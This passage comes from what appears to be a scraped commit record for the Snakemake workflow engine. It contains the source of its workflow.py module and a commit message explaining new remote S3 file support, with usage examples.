job.output) if printd3dag: dag.d3dag() return True elif printdag: print(dag) return True elif printrulegraph: print(dag.rule_dot()) return True elif summary: print(\"\\n\".join(dag.summary(detailed=False))) return True elif detailed_summary: print(\"\\n\".join(dag.summary(detailed=True))) return True elif list_version_changes: items=list( chain(*map(self.persistence.version_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_code_changes: items=list(chain(*map(self.persistence.code_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_input_changes: items=list(chain(*map(self.persistence.input_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_params_changes: items=list( chain(*map(self.persistence.params_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True scheduler=JobScheduler(self, dag, cores, local_cores=local_cores, dryrun=dryrun, touch=touch, cluster=cluster, cluster_config=cluster_config, cluster_sync=cluster_sync, jobname=jobname, immediate_submit=immediate_submit, quiet=quiet, keepgoing=keepgoing, drmaa=drmaa, printreason=printreason, printshellcmds=printshellcmds, latency_wait=latency_wait, benchmark_repeats=benchmark_repeats, greediness=greediness) if not dryrun and not quiet: if len(dag): if cluster or cluster_sync or drmaa: logger.resources_info( \"Provided cluster nodes:{}\".format(nodes)) else: logger.resources_info(\"Provided cores:{}\".format(cores)) logger.resources_info(\"Rules claiming more threads will be scaled down.\") provided_resources=format_resources(resources) if provided_resources: logger.resources_info( \"Provided resources: \" +provided_resources) ignored_resources=format_resource_names( set(resource for job in dag.needrun_jobs for resource in job.resources_dict if resource not in resources)) if ignored_resources: logger.resources_info( \"Ignored resources: \" +ignored_resources) logger.run_info(\"\\n\".join(dag.stats())) else: logger.info(\"Nothing to be done.\") if dryrun and not len(dag): logger.info(\"Nothing to be done.\") success=scheduler.schedule() if success: if dryrun: if not quiet and len(dag): logger.run_info(\"\\n\".join(dag.stats())) elif stats: scheduler.stats.to_json(stats) if not dryrun and not no_hooks: self._onsuccess(logger.get_logfile()) return True else: if not dryrun and not no_hooks: self._onerror(logger.get_logfile()) return False def include(self, snakefile, overwrite_first_rule=False, print_compilation=False, overwrite_shellcmd=None): \"\"\" Include a snakefile. \"\"\" if not urllib.parse.urlparse(snakefile).scheme: if not os.path.isabs(snakefile) and self.included_stack: current_path=os.path.dirname(self.included_stack[-1]) snakefile=os.path.join(current_path, snakefile) snakefile=os.path.abspath(snakefile) if snakefile in self.included: logger.info(\"Multiple include of{} ignored\".format(snakefile)) return self.included.append(snakefile) self.included_stack.append(snakefile) global workflow workflow=self first_rule=self.first_rule code, linemap=parse(snakefile, overwrite_shellcmd=self.overwrite_shellcmd) if print_compilation: print(code) sys.path.insert(0, os.path.dirname(snakefile)) self.linemaps[snakefile]=linemap exec(compile(code, snakefile, \"exec\"), self.globals) if not overwrite_first_rule: self.first_rule=first_rule self.included_stack.pop() def onsuccess(self, func): self._onsuccess=func def onerror(self, func): self._onerror=func def workdir(self, workdir): if self.overwrite_workdir is None: if not os.path.exists(workdir): os.makedirs(workdir) self._workdir=workdir os.chdir(workdir) def configfile(self, jsonpath): \"\"\" Update the global config with the given dictionary. \"\"\" global config c=snakemake.io.load_configfile(jsonpath) update_config(config, c) update_config(config, self.overwrite_config) def ruleorder(self, *rulenames): self._ruleorder.add(*rulenames) def subworkflow(self, name, snakefile=None, workdir=None): sw=Subworkflow(self, name, snakefile, workdir) self._subworkflows[name]=sw self.globals[name]=sw.target def localrules(self, *rulenames): self._localrules.update(rulenames) def rule(self, name=None, lineno=None, snakefile=None): name=self.add_rule(name, lineno, snakefile) rule=self.get_rule(name) def decorate(ruleinfo): if ruleinfo.input: rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1]) if ruleinfo.output: rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1]) if ruleinfo.params: rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1]) if ruleinfo.threads: if not isinstance(ruleinfo.threads, int): raise RuleException(\"Threads value has to be an integer.\", rule=rule) rule.resources[\"_cores\"]=ruleinfo.threads if ruleinfo.resources: args, resources=ruleinfo.resources if args: raise RuleException(\"Resources have to be named.\") if not all(map(lambda r: isinstance(r, int), resources.values())): raise RuleException( \"Resources values have to be integers.\", rule=rule) rule.resources.update(resources) if ruleinfo.priority: if(not isinstance(ruleinfo.priority, int) and not isinstance(ruleinfo.priority, float)): raise RuleException(\"Priority values have to be numeric.\", rule=rule) rule.priority=ruleinfo.priority if ruleinfo.version: rule.version=ruleinfo.version if ruleinfo.log: rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1]) if ruleinfo.message: rule.message=ruleinfo.message if ruleinfo.benchmark: rule.benchmark=ruleinfo.benchmark rule.norun=ruleinfo.norun rule.docstring=ruleinfo.docstring rule.run_func=ruleinfo.func rule.shellcmd=ruleinfo.shellcmd ruleinfo.func.__name__=\"__{}\".format(name) self.globals[ruleinfo.func.__name__]=ruleinfo.func setattr(rules, name, rule) return ruleinfo.func return decorate def docstring(self, string): def decorate(ruleinfo): ruleinfo.docstring=string return ruleinfo return decorate def input(self, *paths, **kwpaths): def decorate(ruleinfo): ruleinfo.input=(paths, kwpaths) return ruleinfo return decorate def output(self, *paths, **kwpaths): def decorate(ruleinfo): ruleinfo.output=(paths, kwpaths) return ruleinfo return decorate def params(self, *params, **kwparams): def decorate(ruleinfo): ruleinfo.params=(params, kwparams) return ruleinfo return decorate def message(self, message): def decorate(ruleinfo): ruleinfo.message=message return ruleinfo return decorate def benchmark(self, benchmark): def decorate(ruleinfo): ruleinfo.benchmark=benchmark return ruleinfo return decorate def threads(self, threads): def decorate(ruleinfo): ruleinfo.threads=threads return ruleinfo return decorate def resources(self, *args, **resources): def decorate(ruleinfo): ruleinfo.resources=(args, resources) return ruleinfo return decorate def priority(self, priority): def decorate(ruleinfo): ruleinfo.priority=priority return ruleinfo return decorate def version(self, version): def decorate(ruleinfo): ruleinfo.version=version return ruleinfo return decorate def log(self, *logs, **kwlogs): def decorate(ruleinfo): ruleinfo.log=(logs, kwlogs) return ruleinfo return decorate def shellcmd(self, cmd): def decorate(ruleinfo): ruleinfo.shellcmd=cmd return ruleinfo return decorate def norun(self): def decorate(ruleinfo): ruleinfo.norun=True return ruleinfo return decorate def run(self, func): return RuleInfo(func) @staticmethod def _empty_decorator(f): return f class RuleInfo: def __init__(self, func): self.func=func self.shellcmd=None self.norun=False self.input=None self.output=None self.params=None self.message=None self.benchmark=None self.threads=None self.resources=None self.priority=None self.version=None self.log=None self.docstring=None class Subworkflow: def __init__(self, workflow, name, snakefile, workdir): self.workflow=workflow self.name=name self._snakefile=snakefile self._workdir=workdir @property def snakefile(self): if self._snakefile is None: return os.path.abspath(os.path.join(self.workdir, \"Snakefile\")) if not os.path.isabs(self._snakefile): return os.path.abspath(os.path.join(self.workflow.basedir, self._snakefile)) return self._snakefile @property def workdir(self): workdir=\".\" if self._workdir is None else self._workdir if not os.path.isabs(workdir): return os.path.abspath(os.path.join(self.workflow.basedir, workdir)) return workdir def target(self, paths): if not_iterable(paths): return flag(os.path.join(self.workdir, paths), \"subworkflow\", self) return[self.target(path) for path in paths] def targets(self, dag): return[f for job in dag.jobs for f in job.subworkflow_input if job.subworkflow_input[f] is self] class Rules: \"\"\" A namespace for rules so that they can be accessed via dot notation. \"\"\" pass def srcdir(path): \"\"\"Return the absolute path, relative to the source directory of the current Snakefile.\"\"\" if not workflow.included_stack: return None return os.path.join(os.path.dirname(workflow.included_stack[-1]), path) ","sourceWithComments":"__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport re\nimport os\nimport sys\nimport signal\nimport json\nimport urllib\nfrom collections import OrderedDict\nfrom itertools import filterfalse, chain\nfrom functools import partial\nfrom operator import attrgetter\n\nfrom snakemake.logging import logger, format_resources, format_resource_names\nfrom snakemake.rules import Rule, Ruleorder\nfrom snakemake.exceptions import RuleException, CreateRuleException, \\\n    UnknownRuleException, NoRulesException, print_exception, WorkflowError\nfrom snakemake.shell import shell\nfrom snakemake.dag import DAG\nfrom snakemake.scheduler import JobScheduler\nfrom snakemake.parser import parse\nimport snakemake.io\nfrom snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\nfrom snakemake.persistence import Persistence\nfrom snakemake.utils import update_config\n\n\nclass Workflow:\n    def __init__(self,\n                 snakefile=None,\n                 snakemakepath=None,\n                 jobscript=None,\n                 overwrite_shellcmd=None,\n                 overwrite_config=dict(),\n                 overwrite_workdir=None,\n                 overwrite_configfile=None,\n                 config_args=None,\n                 debug=False):\n        \"\"\"\n        Create the controller.\n        \"\"\"\n        self._rules = OrderedDict()\n        self.first_rule = None\n        self._workdir = None\n        self.overwrite_workdir = overwrite_workdir\n        self.workdir_init = os.path.abspath(os.curdir)\n        self._ruleorder = Ruleorder()\n        self._localrules = set()\n        self.linemaps = dict()\n        self.rule_count = 0\n        self.basedir = os.path.dirname(snakefile)\n        self.snakefile = os.path.abspath(snakefile)\n        self.snakemakepath = snakemakepath\n        self.included = []\n        self.included_stack = []\n        self.jobscript = jobscript\n        self.persistence = None\n        self.global_resources = None\n        self.globals = globals()\n        self._subworkflows = dict()\n        self.overwrite_shellcmd = overwrite_shellcmd\n        self.overwrite_config = overwrite_config\n        self.overwrite_configfile = overwrite_configfile\n        self.config_args = config_args\n        self._onsuccess = lambda log: None\n        self._onerror = lambda log: None\n        self.debug = debug\n\n        global config\n        config = dict()\n        config.update(self.overwrite_config)\n\n        global rules\n        rules = Rules()\n\n    @property\n    def subworkflows(self):\n        return self._subworkflows.values()\n\n    @property\n    def rules(self):\n        return self._rules.values()\n\n    @property\n    def concrete_files(self):\n        return (\n            file\n            for rule in self.rules for file in chain(rule.input, rule.output)\n            if not callable(file) and not file.contains_wildcard()\n        )\n\n    def check(self):\n        for clause in self._ruleorder:\n            for rulename in clause:\n                if not self.is_rule(rulename):\n                    raise UnknownRuleException(\n                        rulename,\n                        prefix=\"Error in ruleorder definition.\")\n\n    def add_rule(self, name=None, lineno=None, snakefile=None):\n        \"\"\"\n        Add a rule.\n        \"\"\"\n        if name is None:\n            name = str(len(self._rules) + 1)\n        if self.is_rule(name):\n            raise CreateRuleException(\n                \"The name {} is already used by another rule\".format(name))\n        rule = Rule(name, self, lineno=lineno, snakefile=snakefile)\n        self._rules[rule.name] = rule\n        self.rule_count += 1\n        if not self.first_rule:\n            self.first_rule = rule.name\n        return name\n\n    def is_rule(self, name):\n        \"\"\"\n        Return True if name is the name of a rule.\n\n        Arguments\n        name -- a name\n        \"\"\"\n        return name in self._rules\n\n    def get_rule(self, name):\n        \"\"\"\n        Get rule by name.\n\n        Arguments\n        name -- the name of the rule\n        \"\"\"\n        if not self._rules:\n            raise NoRulesException()\n        if not name in self._rules:\n            raise UnknownRuleException(name)\n        return self._rules[name]\n\n    def list_rules(self, only_targets=False):\n        rules = self.rules\n        if only_targets:\n            rules = filterfalse(Rule.has_wildcards, rules)\n        for rule in rules:\n            logger.rule_info(name=rule.name, docstring=rule.docstring)\n\n    def list_resources(self):\n        for resource in set(\n            resource for rule in self.rules for resource in rule.resources):\n            if resource not in \"_cores _nodes\".split():\n                logger.info(resource)\n\n    def is_local(self, rule):\n        return rule.name in self._localrules or rule.norun\n\n    def execute(self,\n                targets=None,\n                dryrun=False,\n                touch=False,\n                cores=1,\n                nodes=1,\n                local_cores=1,\n                forcetargets=False,\n                forceall=False,\n                forcerun=None,\n                prioritytargets=None,\n                quiet=False,\n                keepgoing=False,\n                printshellcmds=False,\n                printreason=False,\n                printdag=False,\n                cluster=None,\n                cluster_config=None,\n                cluster_sync=None,\n                jobname=None,\n                immediate_submit=False,\n                ignore_ambiguity=False,\n                printrulegraph=False,\n                printd3dag=False,\n                drmaa=None,\n                stats=None,\n                force_incomplete=False,\n                ignore_incomplete=False,\n                list_version_changes=False,\n                list_code_changes=False,\n                list_input_changes=False,\n                list_params_changes=False,\n                summary=False,\n                detailed_summary=False,\n                latency_wait=3,\n                benchmark_repeats=3,\n                wait_for_files=None,\n                nolock=False,\n                unlock=False,\n                resources=None,\n                notemp=False,\n                nodeps=False,\n                cleanup_metadata=None,\n                subsnakemake=None,\n                updated_files=None,\n                keep_target_files=False,\n                allowed_rules=None,\n                greediness=1.0,\n                no_hooks=False):\n\n        self.global_resources = dict() if resources is None else resources\n        self.global_resources[\"_cores\"] = cores\n        self.global_resources[\"_nodes\"] = nodes\n\n        def rules(items):\n            return map(self._rules.__getitem__, filter(self.is_rule, items))\n\n        if keep_target_files:\n\n            def files(items):\n                return filterfalse(self.is_rule, items)\n        else:\n\n            def files(items):\n                return map(os.path.relpath, filterfalse(self.is_rule, items))\n\n        if not targets:\n            targets = [self.first_rule\n                       ] if self.first_rule is not None else list()\n        if prioritytargets is None:\n            prioritytargets = list()\n        if forcerun is None:\n            forcerun = list()\n\n        priorityrules = set(rules(prioritytargets))\n        priorityfiles = set(files(prioritytargets))\n        forcerules = set(rules(forcerun))\n        forcefiles = set(files(forcerun))\n        targetrules = set(chain(rules(targets),\n                                filterfalse(Rule.has_wildcards, priorityrules),\n                                filterfalse(Rule.has_wildcards, forcerules)))\n        targetfiles = set(chain(files(targets), priorityfiles, forcefiles))\n        if forcetargets:\n            forcefiles.update(targetfiles)\n            forcerules.update(targetrules)\n\n        rules = self.rules\n        if allowed_rules:\n            rules = [rule for rule in rules if rule.name in set(allowed_rules)]\n\n        if wait_for_files is not None:\n            try:\n                snakemake.io.wait_for_files(wait_for_files,\n                                            latency_wait=latency_wait)\n            except IOError as e:\n                logger.error(str(e))\n                return False\n\n        dag = DAG(\n            self, rules,\n            dryrun=dryrun,\n            targetfiles=targetfiles,\n            targetrules=targetrules,\n            forceall=forceall,\n            forcefiles=forcefiles,\n            forcerules=forcerules,\n            priorityfiles=priorityfiles,\n            priorityrules=priorityrules,\n            ignore_ambiguity=ignore_ambiguity,\n            force_incomplete=force_incomplete,\n            ignore_incomplete=ignore_incomplete or printdag or printrulegraph,\n            notemp=notemp)\n\n        self.persistence = Persistence(\n            nolock=nolock,\n            dag=dag,\n            warn_only=dryrun or printrulegraph or printdag or summary or\n            list_version_changes or list_code_changes or list_input_changes or\n            list_params_changes)\n\n        if cleanup_metadata:\n            for f in cleanup_metadata:\n                self.persistence.cleanup_metadata(f)\n            return True\n\n        dag.init()\n        dag.check_dynamic()\n\n        if unlock:\n            try:\n                self.persistence.cleanup_locks()\n                logger.info(\"Unlocking working directory.\")\n                return True\n            except IOError:\n                logger.error(\"Error: Unlocking the directory {} failed. Maybe \"\n                             \"you don't have the permissions?\")\n                return False\n        try:\n            self.persistence.lock()\n        except IOError:\n            logger.error(\n                \"Error: Directory cannot be locked. Please make \"\n                \"sure that no other Snakemake process is trying to create \"\n                \"the same files in the following directory:\\n{}\\n\"\n                \"If you are sure that no other \"\n                \"instances of snakemake are running on this directory, \"\n                \"the remaining lock was likely caused by a kill signal or \"\n                \"a power loss. It can be removed with \"\n                \"the --unlock argument.\".format(os.getcwd()))\n            return False\n\n        if self.subworkflows and not printdag and not printrulegraph:\n            # backup globals\n            globals_backup = dict(self.globals)\n            # execute subworkflows\n            for subworkflow in self.subworkflows:\n                subworkflow_targets = subworkflow.targets(dag)\n                updated = list()\n                if subworkflow_targets:\n                    logger.info(\n                        \"Executing subworkflow {}.\".format(subworkflow.name))\n                    if not subsnakemake(subworkflow.snakefile,\n                                        workdir=subworkflow.workdir,\n                                        targets=subworkflow_targets,\n                                        updated_files=updated):\n                        return False\n                    dag.updated_subworkflow_files.update(subworkflow.target(f)\n                                                         for f in updated)\n                else:\n                    logger.info(\"Subworkflow {}: Nothing to be done.\".format(\n                        subworkflow.name))\n            if self.subworkflows:\n                logger.info(\"Executing main workflow.\")\n            # rescue globals\n            self.globals.update(globals_backup)\n\n        dag.check_incomplete()\n        dag.postprocess()\n\n        if nodeps:\n            missing_input = [f for job in dag.targetjobs for f in job.input\n                             if dag.needrun(job) and not os.path.exists(f)]\n            if missing_input:\n                logger.error(\n                    \"Dependency resolution disabled (--nodeps) \"\n                    \"but missing input \"\n                    \"files detected. If this happens on a cluster, please make sure \"\n                    \"that you handle the dependencies yourself or turn of \"\n                    \"--immediate-submit. Missing input files:\\n{}\".format(\n                        \"\\n\".join(missing_input)))\n                return False\n\n        updated_files.extend(f for job in dag.needrun_jobs for f in job.output)\n\n        if printd3dag:\n            dag.d3dag()\n            return True\n        elif printdag:\n            print(dag)\n            return True\n        elif printrulegraph:\n            print(dag.rule_dot())\n            return True\n        elif summary:\n            print(\"\\n\".join(dag.summary(detailed=False)))\n            return True\n        elif detailed_summary:\n            print(\"\\n\".join(dag.summary(detailed=True)))\n            return True\n        elif list_version_changes:\n            items = list(\n                chain(*map(self.persistence.version_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_code_changes:\n            items = list(chain(*map(self.persistence.code_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_input_changes:\n            items = list(chain(*map(self.persistence.input_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_params_changes:\n            items = list(\n                chain(*map(self.persistence.params_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n\n        scheduler = JobScheduler(self, dag, cores,\n                                 local_cores=local_cores,\n                                 dryrun=dryrun,\n                                 touch=touch,\n                                 cluster=cluster,\n                                 cluster_config=cluster_config,\n                                 cluster_sync=cluster_sync,\n                                 jobname=jobname,\n                                 immediate_submit=immediate_submit,\n                                 quiet=quiet,\n                                 keepgoing=keepgoing,\n                                 drmaa=drmaa,\n                                 printreason=printreason,\n                                 printshellcmds=printshellcmds,\n                                 latency_wait=latency_wait,\n                                 benchmark_repeats=benchmark_repeats,\n                                 greediness=greediness)\n\n        if not dryrun and not quiet:\n            if len(dag):\n                if cluster or cluster_sync or drmaa:\n                    logger.resources_info(\n                        \"Provided cluster nodes: {}\".format(nodes))\n                else:\n                    logger.resources_info(\"Provided cores: {}\".format(cores))\n                    logger.resources_info(\"Rules claiming more threads will be scaled down.\")\n                provided_resources = format_resources(resources)\n                if provided_resources:\n                    logger.resources_info(\n                        \"Provided resources: \" + provided_resources)\n                ignored_resources = format_resource_names(\n                    set(resource for job in dag.needrun_jobs for resource in\n                        job.resources_dict if resource not in resources))\n                if ignored_resources:\n                    logger.resources_info(\n                        \"Ignored resources: \" + ignored_resources)\n                logger.run_info(\"\\n\".join(dag.stats()))\n            else:\n                logger.info(\"Nothing to be done.\")\n        if dryrun and not len(dag):\n            logger.info(\"Nothing to be done.\")\n\n        success = scheduler.schedule()\n\n        if success:\n            if dryrun:\n                if not quiet and len(dag):\n                    logger.run_info(\"\\n\".join(dag.stats()))\n            elif stats:\n                scheduler.stats.to_json(stats)\n            if not dryrun and not no_hooks:\n                self._onsuccess(logger.get_logfile())\n            return True\n        else:\n            if not dryrun and not no_hooks:\n                self._onerror(logger.get_logfile())\n            return False\n\n    def include(self, snakefile,\n                overwrite_first_rule=False,\n                print_compilation=False,\n                overwrite_shellcmd=None):\n        \"\"\"\n        Include a snakefile.\n        \"\"\"\n        # check if snakefile is a path to the filesystem\n        if not urllib.parse.urlparse(snakefile).scheme:\n            if not os.path.isabs(snakefile) and self.included_stack:\n                current_path = os.path.dirname(self.included_stack[-1])\n                snakefile = os.path.join(current_path, snakefile)\n            snakefile = os.path.abspath(snakefile)\n        # else it could be an url.\n        # at least we don't want to modify the path for clarity.\n\n        if snakefile in self.included:\n            logger.info(\"Multiple include of {} ignored\".format(snakefile))\n            return\n        self.included.append(snakefile)\n        self.included_stack.append(snakefile)\n\n        global workflow\n\n        workflow = self\n\n        first_rule = self.first_rule\n        code, linemap = parse(snakefile,\n                              overwrite_shellcmd=self.overwrite_shellcmd)\n\n        if print_compilation:\n            print(code)\n\n        # insert the current directory into sys.path\n        # this allows to import modules from the workflow directory\n        sys.path.insert(0, os.path.dirname(snakefile))\n\n        self.linemaps[snakefile] = linemap\n        exec(compile(code, snakefile, \"exec\"), self.globals)\n        if not overwrite_first_rule:\n            self.first_rule = first_rule\n        self.included_stack.pop()\n\n    def onsuccess(self, func):\n        self._onsuccess = func\n\n    def onerror(self, func):\n        self._onerror = func\n\n    def workdir(self, workdir):\n        if self.overwrite_workdir is None:\n            if not os.path.exists(workdir):\n                os.makedirs(workdir)\n            self._workdir = workdir\n            os.chdir(workdir)\n\n    def configfile(self, jsonpath):\n        \"\"\" Update the global config with the given dictionary. \"\"\"\n        global config\n        c = snakemake.io.load_configfile(jsonpath)\n        update_config(config, c)\n        update_config(config, self.overwrite_config)\n\n    def ruleorder(self, *rulenames):\n        self._ruleorder.add(*rulenames)\n\n    def subworkflow(self, name, snakefile=None, workdir=None):\n        sw = Subworkflow(self, name, snakefile, workdir)\n        self._subworkflows[name] = sw\n        self.globals[name] = sw.target\n\n    def localrules(self, *rulenames):\n        self._localrules.update(rulenames)\n\n    def rule(self, name=None, lineno=None, snakefile=None):\n        name = self.add_rule(name, lineno, snakefile)\n        rule = self.get_rule(name)\n\n        def decorate(ruleinfo):\n            if ruleinfo.input:\n                rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1])\n            if ruleinfo.output:\n                rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1])\n            if ruleinfo.params:\n                rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1])\n            if ruleinfo.threads:\n                if not isinstance(ruleinfo.threads, int):\n                    raise RuleException(\"Threads value has to be an integer.\",\n                                        rule=rule)\n                rule.resources[\"_cores\"] = ruleinfo.threads\n            if ruleinfo.resources:\n                args, resources = ruleinfo.resources\n                if args:\n                    raise RuleException(\"Resources have to be named.\")\n                if not all(map(lambda r: isinstance(r, int),\n                               resources.values())):\n                    raise RuleException(\n                        \"Resources values have to be integers.\",\n                        rule=rule)\n                rule.resources.update(resources)\n            if ruleinfo.priority:\n                if (not isinstance(ruleinfo.priority, int) and\n                    not isinstance(ruleinfo.priority, float)):\n                    raise RuleException(\"Priority values have to be numeric.\",\n                                        rule=rule)\n                rule.priority = ruleinfo.priority\n            if ruleinfo.version:\n                rule.version = ruleinfo.version\n            if ruleinfo.log:\n                rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1])\n            if ruleinfo.message:\n                rule.message = ruleinfo.message\n            if ruleinfo.benchmark:\n                rule.benchmark = ruleinfo.benchmark\n            rule.norun = ruleinfo.norun\n            rule.docstring = ruleinfo.docstring\n            rule.run_func = ruleinfo.func\n            rule.shellcmd = ruleinfo.shellcmd\n            ruleinfo.func.__name__ = \"__{}\".format(name)\n            self.globals[ruleinfo.func.__name__] = ruleinfo.func\n            setattr(rules, name, rule)\n            return ruleinfo.func\n\n        return decorate\n\n    def docstring(self, string):\n        def decorate(ruleinfo):\n            ruleinfo.docstring = string\n            return ruleinfo\n\n        return decorate\n\n    def input(self, *paths, **kwpaths):\n        def decorate(ruleinfo):\n            ruleinfo.input = (paths, kwpaths)\n            return ruleinfo\n\n        return decorate\n\n    def output(self, *paths, **kwpaths):\n        def decorate(ruleinfo):\n            ruleinfo.output = (paths, kwpaths)\n            return ruleinfo\n\n        return decorate\n\n    def params(self, *params, **kwparams):\n        def decorate(ruleinfo):\n            ruleinfo.params = (params, kwparams)\n            return ruleinfo\n\n        return decorate\n\n    def message(self, message):\n        def decorate(ruleinfo):\n            ruleinfo.message = message\n            return ruleinfo\n\n        return decorate\n\n    def benchmark(self, benchmark):\n        def decorate(ruleinfo):\n            ruleinfo.benchmark = benchmark\n            return ruleinfo\n\n        return decorate\n\n    def threads(self, threads):\n        def decorate(ruleinfo):\n            ruleinfo.threads = threads\n            return ruleinfo\n\n        return decorate\n\n    def resources(self, *args, **resources):\n        def decorate(ruleinfo):\n            ruleinfo.resources = (args, resources)\n            return ruleinfo\n\n        return decorate\n\n    def priority(self, priority):\n        def decorate(ruleinfo):\n            ruleinfo.priority = priority\n            return ruleinfo\n\n        return decorate\n\n    def version(self, version):\n        def decorate(ruleinfo):\n            ruleinfo.version = version\n            return ruleinfo\n\n        return decorate\n\n    def log(self, *logs, **kwlogs):\n        def decorate(ruleinfo):\n            ruleinfo.log = (logs, kwlogs)\n            return ruleinfo\n\n        return decorate\n\n    def shellcmd(self, cmd):\n        def decorate(ruleinfo):\n            ruleinfo.shellcmd = cmd\n            return ruleinfo\n\n        return decorate\n\n    def norun(self):\n        def decorate(ruleinfo):\n            ruleinfo.norun = True\n            return ruleinfo\n\n        return decorate\n\n    def run(self, func):\n        return RuleInfo(func)\n\n    @staticmethod\n    def _empty_decorator(f):\n        return f\n\n\nclass RuleInfo:\n    def __init__(self, func):\n        self.func = func\n        self.shellcmd = None\n        self.norun = False\n        self.input = None\n        self.output = None\n        self.params = None\n        self.message = None\n        self.benchmark = None\n        self.threads = None\n        self.resources = None\n        self.priority = None\n        self.version = None\n        self.log = None\n        self.docstring = None\n\n\nclass Subworkflow:\n    def __init__(self, workflow, name, snakefile, workdir):\n        self.workflow = workflow\n        self.name = name\n        self._snakefile = snakefile\n        self._workdir = workdir\n\n    @property\n    def snakefile(self):\n        if self._snakefile is None:\n            return os.path.abspath(os.path.join(self.workdir, \"Snakefile\"))\n        if not os.path.isabs(self._snakefile):\n            return os.path.abspath(os.path.join(self.workflow.basedir,\n                                                self._snakefile))\n        return self._snakefile\n\n    @property\n    def workdir(self):\n        workdir = \".\" if self._workdir is None else self._workdir\n        if not os.path.isabs(workdir):\n            return os.path.abspath(os.path.join(self.workflow.basedir,\n                                                workdir))\n        return workdir\n\n    def target(self, paths):\n        if not_iterable(paths):\n            return flag(os.path.join(self.workdir, paths), \"subworkflow\", self)\n        return [self.target(path) for path in paths]\n\n    def targets(self, dag):\n        return [f for job in dag.jobs for f in job.subworkflow_input\n                if job.subworkflow_input[f] is self]\n\n\nclass Rules:\n    \"\"\" A namespace for rules so that they can be accessed via dot notation. \"\"\"\n    pass\n\n\ndef srcdir(path):\n    \"\"\"Return the absolute path, relative to the source directory of the current Snakefile.\"\"\"\n    if not workflow.included_stack:\n        return None\n    return os.path.join(os.path.dirname(workflow.included_stack[-1]), path)\n"}},"msg":"Initial commit with support for remote files.\n\nThis introduces changes that scratch an itch within our research group for remote file support, and I hope the new functionality will be useful for others as well.\n\nWhat is it all about? Wouldn't it be wonderful if you would use Snakemake with remote data stored on Amazon S3? Imagine being able to read and write the same files as your collaborators without rsyncing files back and forth or using pricey network-attached storage. Want to output and store 1PB of small files? Want to let someone else worry about durability? Want to work with large files locally that you can store individually but that are too large in aggregate? The support for remote storage introduced with these changes will allow you do all of these things! Remote storage is initially intended to work with AWS S3 and things sporting a similar API, though it is flexible enough that would could extended it to support other remote providers. It expect you to already have an S3 bucket setup, and API credentials for it permitting read\/write access.\n\nHere's how you use it:\n\nThe `Snakefile` now supports a wrapper function, `remote()`, indicating a file is on a remote storage provider (this is similar to `temp()` or `protected()`). During rule execution, the file (or object) specified, is downloaded to the `cwd`, within a sub-directory bearing the same name as the bucket. This lets you have multiple remote origins with reduced likelihood of name collisions, and allows snakemake to easily translate remote objects to local file paths. The `remote()` wrapper is mutually-exclusive with the `temp()` and `protected()` wrappers.\n\nThe implementation of all communication with the remote storage provider is specified in a class passed as a keyword argument to the remote wrapper. This class defines methods related to being a RemoteObject(). By default, the S3 provider is used and it does not need to be specified explicitly. If you are interested in creating a custom remote storage provider for whatever system you are using, implement the methods defined in the abstract base class `snakemake.remote_providers.RemoteObjectProvider`. Take a look at the S3 provider for an example implementation. To use a custom remote storage provider implementation (FTP, etc.), import it within your `Snakefile`, and set the `provider` keyword argument, as is being done with S3 below:\n\n    import snakemake.remote_providers.S3 as S3\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3)\n\nSince S3 is the default remote storage provider, it can be omitted from the `Snakefile`:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\")\n\nAdditional kwargs can be passed to the remote provider this way to set credentials, should you not want to rely on whichever credentials happen to be stored in the environment variables (suggestion: if using multiple buckets with different credentials, read in the key and secret within your `Snakefile` and pass as appropriate to the `remote()` wrappers). For the S3 provider, the additional kwargs are passed straight through to the boto `connect_s3()` method, so refer to the [boto docs](https:\/\/boto.readthedocs.org\/en\/latest\/ref\/s3.html#boto.s3.connection.S3Connection) to see the available parameters:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3, additional_kwargs={\"aws_access_key_id\":\"myKey\", \"aws_secret_access_key\":\"mySecret\"})\n\nThis can also be used to specify a custom URL to connect to rather than AWS, for a different service offering an S3-like API:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3, additional_kwargs={\"host\":\"mystorageapi.example.com\"})\n\nFor any storage backend with an API deviating significantly from that of S3, it may make sense to create a new remote provider.\n\nExpand still works as expected, just wrap the expansion:\n\n    rule all:\n        input:\n            remote(expand(\"bucket-name\/{letter}-2.txt\", letter=[\"A\", \"B\", \"C\"]), provider=S3)\n\nOnly remote files needed to satisfy the DAG build are downloaded for the workflow.  By default, remote files downloaded prior to rule execution and are removed locally as soon as no rules depend on them. Remote files can be explicitly kept by setting the `keep=True` keyword argument:\n\n    rule all:\n        input: remote('bucket-name\/prefix{split_id}.txt', keep=True)\n\nIf you wish to have a rule to simply download a file to a local copy, you can do so by declaring the same file path locally as is used by the remote file:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/out.txt\")\n        output:\n            \"bucket-name\/out.txt\"\n        run:\n            shell(\"cp {output[0]} .\/\")\n\nHere's a brief summary of the changes. I tried to minimize the impact on existing code, relying where possible on external classes, new functions, and the use of decorators to connect them.\n\nWithin `io.py`, the usage of flags has been extended to store not just boolean values, but also objects. This is how, 